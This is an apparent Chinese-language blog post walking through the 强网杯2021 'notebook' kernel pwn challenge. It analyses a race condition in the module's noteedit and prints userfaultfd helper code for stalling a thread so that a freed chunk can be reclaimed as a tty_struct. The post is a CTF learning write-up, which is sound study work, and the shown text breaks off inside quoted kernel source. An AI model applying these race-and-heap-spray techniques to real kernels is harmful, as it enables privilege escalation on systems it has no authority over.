<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="本篇文章笔者借助一道题来学习一下kernel中的一种条件竞争利用方式：userfaultfd。  强网杯2021-notebook 这是一道kernel pwn题。我们首先打开ko文件看看。 本文主要参考资料：资料  Step 1: 查看file_operations结构体  找到file_operations结构体，其中定义了write函数和ioctl函数的地址。但这里实际上还隐含着定义了rea">
<meta property="og:type" content="article">
<meta property="og:title" content="Kernel pwn 入门 (6)">
<meta property="og:url" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:description" content="本篇文章笔者借助一道题来学习一下kernel中的一种条件竞争利用方式：userfaultfd。  强网杯2021-notebook 这是一道kernel pwn题。我们首先打开ko文件看看。 本文主要参考资料：资料  Step 1: 查看file_operations结构体  找到file_operations结构体，其中定义了write函数和ioctl函数的地址。但这里实际上还隐含着定义了rea">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/1.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/2.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/3.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/4.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/5.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/6.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/7.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/8.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/9.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/10.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/11.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/12.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/13.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/14.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/15.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/16.png">
<meta property="og:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/17.png">
<meta property="article:published_time" content="2023-02-28T14:32:20.000Z">
<meta property="article:modified_time" content="2023-03-01T03:30:39.535Z">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/1.png">

<link rel="canonical" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Kernel pwn 入门 (6) | CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Kernel pwn 入门 (6)
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-28 22:32:20" itemprop="dateCreated datePublished" datetime="2023-02-28T22:32:20+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-03-01 11:30:39" itemprop="dateModified" datetime="2023-03-01T11:30:39+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>34k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>31 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>本篇文章笔者借助一道题来学习一下kernel中的一种条件竞争利用方式：userfaultfd。</p>
<h1 id="强网杯2021-notebook"><a class="markdownIt-Anchor" href="#强网杯2021-notebook"></a> 强网杯2021-notebook</h1>
<p>这是一道kernel pwn题。我们首先打开ko文件看看。<br />
本文主要参考资料：<a target="_blank" rel="noopener" href="https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd">资料</a></p>
<h1 id="step-1-查看file_operations结构体"><a class="markdownIt-Anchor" href="#step-1-查看file_operations结构体"></a> Step 1: 查看file_operations结构体</h1>
<p><img src="1.png" alt="" /><br />
找到file_operations结构体，其中定义了write函数和ioctl函数的地址。但这里实际上还隐含着定义了read函数。因为read函数在模块中的偏移为0，因此可以认为结构体中所有为0的字段都指向read函数。不过我们这里因为用不到其他函数，因此认为read函数也被定义了。</p>
<h1 id="step-2-分析write函数"><a class="markdownIt-Anchor" href="#step-2-分析write函数"></a> Step 2: 分析write函数</h1>
<p><img src="2.png" alt="" /><br />
write函数就是一个普通的写入，从用户内存读取，其中第三个参数index不能大于0x10，复制的size由notebook中的size决定。</p>
<h1 id="step-3-分析ioctl函数"><a class="markdownIt-Anchor" href="#step-3-分析ioctl函数"></a> Step 3: 分析ioctl函数</h1>
<p><img src="3.png" alt="" /><br />
ioctl函数一共有4种有效指令码，分别对应add、gift、del、edit四个函数。接下来分别进行分析。</p>
<h1 id="step-4-分析noteadd函数"><a class="markdownIt-Anchor" href="#step-4-分析noteadd函数"></a> Step 4: 分析noteadd函数</h1>
<p><img src="4.png" alt="" /><br />
添加函数中每一个note的大小不能超过0x60，传入的第三个参数将被拷贝到name中。</p>
<h1 id="step-5-分析notegift函数"><a class="markdownIt-Anchor" href="#step-5-分析notegift函数"></a> Step 5: 分析notegift函数</h1>
<p><img src="5.png" alt="" /><br />
这个函数是直接将notebook这个数组输出出来了，我们能够实时获取到notebook中所有指针和size的信息。看上去是一个比较有用的函数。</p>
<h1 id="step-6-分析notedel函数"><a class="markdownIt-Anchor" href="#step-6-分析notedel函数"></a> Step 6: 分析notedel函数</h1>
<p><img src="6.png" alt="" /><br />
删除函数中规中矩，就是一个删除功能，不留悬挂指针。</p>
<h1 id="step-7-分析noteedit函数"><a class="markdownIt-Anchor" href="#step-7-分析noteedit函数"></a> Step 7: 分析noteedit函数</h1>
<p><img src="7.png" alt="" /><br />
这个函数会修改内存块的大小，使用krealloc函数对齐重新分配空间，而且只有在确认重新分配的空间有效的情况下才会修改notebook数组中的元素。当传入的newsize为0时，会被当做free处理释放空间，同时移出指针和size。</p>
<h1 id="step-8-分析read函数"><a class="markdownIt-Anchor" href="#step-8-分析read函数"></a> Step 8: 分析read函数</h1>
<p><img src="8.png" alt="" /><br />
read函数也很普通，就是一个将notebook内存块中的内容读出的函数。</p>
<h1 id="step-9-查看runsh和init脚本"><a class="markdownIt-Anchor" href="#step-9-查看runsh和init脚本"></a> Step 9: 查看run.sh和init脚本</h1>
<p>本题的run.sh中，我们发现打开了kaslr、SMP保护。<br />
本题的init文件中，有一些值得关注的地方：<br />
<img src="9.png" alt="" /><br />
脚本中将/proc/modules中的notebook文件移动到了/tmp中，我们能够通过/tmp/moduleaddr这个文件获取到notebook这个模块在内核中的加载地址。这便于我们调试，同时也可能为后面的漏洞利用提供条件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /tmp/moduleaddr </span><br><span class="line">notebook 16384 0 - Live 0xffffffffc03ae000 (O)</span><br></pre></td></tr></table></figure>
<h1 id="step-10-漏洞分析"><a class="markdownIt-Anchor" href="#step-10-漏洞分析"></a> Step 10: 漏洞分析</h1>
<p>注意noteedit函数，其中并没有对新分配的内存大小进行限制，也就是说我们可以绕过noteadd中申请大小最大只能为0x60的限制。</p>
<p>然后再看一下各个函数的加锁情况。noteadd、noteedit函数加了读锁，notedel函数加了写锁。这里存在条件竞争漏洞：noteedit使用的是krealloc函数重新分配内存。当重新分配的大小大于原来的大小时会将原来的内存空间释放，并且noteedit函数中<strong>notebook相应指针的修改发生在krealloc之后</strong>。如果在当前线程的noteedit还没有修改notebook时将这块内存重新分配，并在另一个线程中写入，就会造成条件竞争漏洞。但在当前线程一直在执行的情况下，krealloc和修改指针的操作相隔时间极短，在这段时间内重新分配到这块空间并修改难度极大。因此<strong>本题使用一种称为userfaultfd</strong>的利用方式来解决这个问题。</p>
<blockquote>
<p>（摘自<a target="_blank" rel="noopener" href="https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd">资料</a>）userfaultfd 本身只是一个常规的与处理缺页异常相关的系统调用，但是通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高。</p>
</blockquote>
<p>在Linux 5.4版本及以下内核中，这种利用方式都是可行的，往上的版本中内核规定只有root才有权限执行此类操作。不过我们通过uname -a命令查看到本题的linux版本是4.15.8，可以使用这种方式进行利用。</p>
<p>这种利用方式在原理上较为复杂，但是有现成的调用函数可用，只要传入适当的参数就能够设定在缺页异常时执行某个函数。具体的原理在<a target="_blank" rel="noopener" href="https://blog.csdn.net/maybeYoc/article/details/123456398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165899942316782184627366%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165899942316782184627366&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123456398-null-null.142%5Ev35%5Econtrol&amp;utm_term=userfaultfd&amp;spm=1018.2226.3001.4187">这篇文章</a>中有详细的解释，感兴趣的读者可以了解一下，不过不看也没关系，我们使用固定的函数模板即可。（以下代码摘自<a target="_blank" rel="noopener" href="https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd">资料</a>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span> (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span>	<span class="comment">// 这个arg参数对应上面registerUserFaultFd中pthread_create的第四个参数，将uffd文件描述符传入本函数中</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * [在这停顿.jpg]</span></span><br><span class="line"><span class="comment">         * 当 poll 返回时说明出现了缺页异常</span></span><br><span class="line"><span class="comment">         * 你可以在这里插入一些比如说 sleep() 一类的操作</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么我们应该如何触发缺页异常呢？很简单，我们只需要在noteedit函数中传入mmap出来空间的地址即可。那么有的读者就要问了，mmap出来的空间不是已经被映射了吗，krealloc之后的copy_from_user函数拷贝的大小是0x100远小于0x1000，为什么还会缺页呢？我们直接访问试试。写一条语句直接向这块空间写入一个字节，最后居然是segmentation fault，段错误。这是怎么回事？我们不是通过mmap已经分配了这个空间了吗？<br />
<img src="10.png" alt="" /><br />
<img src="11.png" alt="" /><br />
通过内核调试，我们发现，内核确实无法访问这块mmap出来的空间，即使是vmmap也没有显示这块空间。</p>
<p>找了很长时间的资料，最终在<a target="_blank" rel="noopener" href="https://blog.csdn.net/21cnbao/article/details/108480659?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165908725716782388037719%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165908725716782388037719&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108480659-null-null.142%5Ev35%5Econtrol&amp;utm_term=%E4%BD%BF%E7%94%A8mmap%E5%8F%91%E7%94%9F%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8&amp;spm=1018.2226.3001.4187">这篇文章</a>中发现了一丝端倪：</p>
<blockquote>
<p>当我们应用程序使用ｍｍap来创建匿名的内存映射的时候，页同样只是分配了虚拟内存，并没有分配物理内存，第一次去访问的时候才会通过触发缺页异常来分配物理页建立和虚拟页的映射关系。</p>
</blockquote>
<p>即这块内存并没有物理内存与之对应，因此会触发缺页异常。</p>
<p>我们事先对这块mmap出来的空间注册userfaultfd函数，那么缺页异常发生时就会执行这个函数了，在函数中我们可以以各种方式阻塞该线程的执行，最为简单的就是调用sleep函数睡一段时间，然后另外一个线程趁此机会进行其他的恶意操作（指重复打开/dev/ptmx文件使原note空间有可能被分配为tty_struct结构体，然后write函数调用进行修改）。</p>
<p>下面是打开/dev/ptmx时执行的一个关键函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __init <span class="title function_">unix98_pty_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	ptm_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,</span><br><span class="line">			TTY_DRIVER_RESET_TERMIOS |</span><br><span class="line">			TTY_DRIVER_REAL_RAW |</span><br><span class="line">			TTY_DRIVER_DYNAMIC_DEV |</span><br><span class="line">			TTY_DRIVER_DEVPTS_MEM |</span><br><span class="line">			TTY_DRIVER_DYNAMIC_ALLOC);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(ptm_driver))</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t allocate Unix98 ptm driver&quot;</span>);</span><br><span class="line">	pts_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,</span><br><span class="line">			TTY_DRIVER_RESET_TERMIOS |</span><br><span class="line">			TTY_DRIVER_REAL_RAW |</span><br><span class="line">			TTY_DRIVER_DYNAMIC_DEV |</span><br><span class="line">			TTY_DRIVER_DEVPTS_MEM |</span><br><span class="line">			TTY_DRIVER_DYNAMIC_ALLOC);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(pts_driver))</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t allocate Unix98 pts driver&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ptm_driver-&gt;driver_name = <span class="string">&quot;pty_master&quot;</span>;</span><br><span class="line">	ptm_driver-&gt;name = <span class="string">&quot;ptm&quot;</span>;</span><br><span class="line">	ptm_driver-&gt;major = UNIX98_PTY_MASTER_MAJOR;</span><br><span class="line">	ptm_driver-&gt;minor_start = <span class="number">0</span>;</span><br><span class="line">	ptm_driver-&gt;type = TTY_DRIVER_TYPE_PTY;</span><br><span class="line">	ptm_driver-&gt;subtype = PTY_TYPE_MASTER;</span><br><span class="line">	ptm_driver-&gt;init_termios = tty_std_termios;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_iflag = <span 